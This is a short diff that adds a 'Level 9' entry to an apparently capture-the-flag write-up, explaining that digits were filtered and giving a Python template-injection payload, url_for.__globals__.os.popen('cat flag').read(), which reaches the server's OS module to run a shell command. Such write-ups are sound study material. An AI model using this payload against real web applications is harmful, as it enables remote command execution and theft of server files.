@@ -148,3 +148,12 @@
 
 
 ```
+
+### Level 9
+* For this level, the hardest part was finding out what was blocked!
+	* Turns out, any digit was blocked
+* Luckily, we can use the same payload we've been using for a while without any numbers
+
+```python3
+url_for.__globals__.os.popen('cat flag').read()
+```
